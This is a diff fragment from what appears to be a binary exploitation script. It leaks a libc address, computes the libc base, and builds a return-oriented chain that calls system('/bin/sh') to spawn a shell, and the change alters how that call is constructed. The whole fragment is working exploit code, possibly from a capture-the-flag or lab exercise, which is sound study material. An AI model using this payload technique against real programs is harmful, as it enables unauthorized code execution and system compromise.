@@ -35,7 +35,7 @@ p.write(buf)
 ref_addr = p.read_p32()
 libc.set_base(ref_addr, '__libc_start_main')
 
-buf = libc.call('system', libc.str('/bin/sh'))
+buf = rop.call(libc.addr('system'), libc.str('/bin/sh'))
 buf += rop.fill(100, buf)
 
 p.write(buf)
